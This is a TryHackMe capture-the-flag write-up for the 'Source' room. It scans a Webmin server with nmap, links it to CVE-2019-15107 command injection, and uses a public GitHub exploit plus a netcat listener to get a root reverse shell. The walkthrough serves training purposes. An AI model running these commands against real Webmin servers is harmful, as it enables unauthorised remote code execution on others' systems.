# Try Hack Me - Source
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 60
# Vulnerabilities: RCE though vulnerable endpoint 

# Reconnaissance:

nmap scan:
```bash
nmap -sV -sC <target_ip>
```
the nmap scans are taking wayy to long than usual so lets find out the open ports using some other flags like

```bash
nmap -Pn <target_ip>
```
or
```bash
nmap -p- --min-rate=1000 <target_ip>
```
using the above commands we get a hit at the ports:

PORT      STATE SERVICE

22/tcp    open  ssh

10000/tcp open  snet-sensor-mgmt

now lets use the -sV and -sC port on the port 10000 to find exactly whats running on that port for further enumeration.
```bash
nmap -p 10000 -sV -sC <target_ip>
```
PORT      STATE SERVICE VERSION

10000/tcp open  http    MiniServ 1.890 (Webmin httpd)

|_http-server-header: MiniServ/1.890

|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

i did some research using deepseek and google and found out that this vulnerability is probably the CVE-2019-15107 which can enable RCE through a specific endpoint named password_change.cgi. 

i will leave some documentation from the National vulnerability Databse down here: An issue was discovered in Webmin <=1.920. The parameter old in password_change.cgi contains a command injection vulnerability.
inshort we can exploit this vulnerability from the already available exploits available on sites like exploit.db or metasploit. in this writeup we are going to use a python script from github. just clone this repository on your system:

```bash
git clone https://github.com/MuirlandOracle/CVE-2019-15107.git
```
now navigate to the directory where the exploits are saved.
```bash
cd CVE-2019-15107
```
now if you have no problems with pip3 then you could directly download them using the command pip3 install -r requirements.txt. but if you are like me who faces some issues while downloading content using pip3, you can install all the requirements in a python virtual environment. just use the following commmands if necessary:

```bash
python3 -m venv virtualenv
```
```bash
#now activate the python virtual environment
source virtualenv/bin/activate
```

we can now download the requirements.txt now 

```bash
pip3 install -r requirements.txt
```
# Shell access:

now we run the python script which will be easy as cake.

```bash
python3 CVE-2019-15107.py <target_ip> 
```
no need to mention the port as the default port is already 10000. now we get an interface which asks us to enter shell to get a reverseshell. 

```bash
shell
```
now we input our attacked ip and port while starting a netcat listener in another terminal

```bash
nc -lnvp 4444
```
the script's interface will look something like this!

[*] Server is running in SSL mode. Switching to HTTPS

[+] Connected to https://10.82.149.112:10000/ successfully.

[+] Server version (1.890) should be vulnerable!

[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.

Type commands to have them executed on the target.                       

[*] Type 'exit' to exit.

[*] Type 'shell' to obtain a full reverse shell (UNIX only).

#shell

[*] Starting the reverse shell process

[*] For UNIX targets only!

[*] Use 'exit' to return to the pseudoshell at any time

Please enter the IP address for the shell: <target_ip>

Please enter the port number for the shell: 4444

[*] Start a netcat listener in a new window (nc -lvnp 4444) then press enter.                                                                     

[+] You should now have a reverse shell on the target

and just like that we have a reverse shell on our attacker machine and we are logged in already as root. no privilege escalation required hehe!. we read and submit both user.txt and root.txt flags.

shout out to @MuirlandOracle for the brilliant python script! i wish one day i will be able to write such powerful scripts in python :) 
                                                                      
